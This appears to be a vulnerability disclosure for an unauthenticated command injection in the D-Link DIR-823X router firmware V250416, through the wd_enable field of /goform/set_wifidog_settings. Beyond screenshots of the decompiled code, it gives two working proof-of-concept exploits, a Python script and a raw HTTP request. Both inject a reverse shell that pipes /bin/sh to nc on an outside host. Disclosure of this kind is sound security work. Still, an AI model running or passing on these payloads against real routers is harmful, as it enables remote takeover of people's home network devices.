
# Information - DIR-823X V250416 Command Execution Vulnerability

**Vendor of the products:**  D-Link

**Vendor's website:** https://www.dlink.com.cn/

**Affected products:** DIR-823X

**Affected firmware version:** V250416 (250416)

**Firmware download address:** [D-Link Technical Support]([D-Link Technical Support](https://www.dlink.com.cn/techsupport/ProductInfo.aspx?m=DIR-823X))

**Submitter:** Yun Zhang (DavCloudz)

# Overview

The latest version 250416 (250416) of the D-LINK DIR-823X router contains an unauthorized command execution vulnerability. The vulnerability resides in the /usr/sbin/goahead file. Accessing the router's /goform/set_wifidog_settings function and requesting specific fields allows arbitrary command execution without authentication, enabling remote command execution and even shell access.

# Vulnerability details

The API for invoking the function:

<img width="1353" height="231" alt="image-20251224174316621" src="https://github.com/user-attachments/assets/c20328ab-e7ca-42f3-9a2c-e509951b55b0" />

You can see that many values are taken here, such as wd_enable, and the sub_415028 function is called later:

<img width="1428" height="657" alt="image-20251224174337656" src="https://github.com/user-attachments/assets/e4679711-1f0c-4552-b096-e967ed257281" />

<img width="1512" height="284" alt="image-20251224174554866" src="https://github.com/user-attachments/assets/768e3583-b46b-4fff-b74e-a006a5ada874" />

sub_412E7C function is stitched and executed by commands:

<img width="1638" height="753" alt="image-20251224174639190" src="https://github.com/user-attachments/assets/e810a019-69b7-499e-af27-b463346bcdd1" />

There is command filtering here, but there is still command injection if the filtering is not strict

<img width="1287" height="582" alt="image-20251224174650402" src="https://github.com/user-attachments/assets/9b397c52-1b93-44b9-ab4e-ffc6854615a3" />

<img width="1524" height="744" alt="image-20251224174701349" src="https://github.com/user-attachments/assets/b81f28cb-6c79-4997-aa31-cc149967ba10" />


# POC-1

```py
import requests

TARGET_URL = "http://192.168.122.150/goform/set_wifidog_settings"

reverse_shell_cmd = '" | rm -f /tmp/f && mkfifo /tmp/f && cat /tmp/f | /bin/sh -i 2>&1 | nc 192.168.102.145 4444 > /tmp/f"'

try:
    response = requests.post(
        TARGET_URL,
        data={"wd_enable": reverse_shell_cmd},
        timeout=10
    )
    print(f"请求发送成功，状态码: {response.status_code}")
    print(f"响应内容: {response.text}")

except requests.exceptions.RequestException as e:
print(f"请求失败: {e}")
```
# POC-2

```
POST /goform/set_wifidog_settings HTTP/1.1
Host: 192.168.122.150
Content-Type: application/x-www-form-urlencoded
Content-Length: 131

wd_enable=%22+%7C+rm+-f+%2Ftmp%2Ff+%26%26+mkfifo+%2Ftmp%2Ff+%26%26+cat+%2Ftmp%2Ff+%7C+%2Fbin%2Fsh+-i+2%3E%261+%7C+nc+192.168.102.145+4444+%3E+%2Ftmp%2Ff%22
```

After running the PoC, the vulnerability was successfully triggered, resulting in valid system command execution：

<img width="1434" height="633" alt="image-20251224174901983" src="https://github.com/user-attachments/assets/05c72081-e003-42b0-8c4f-8378d95185d7" />
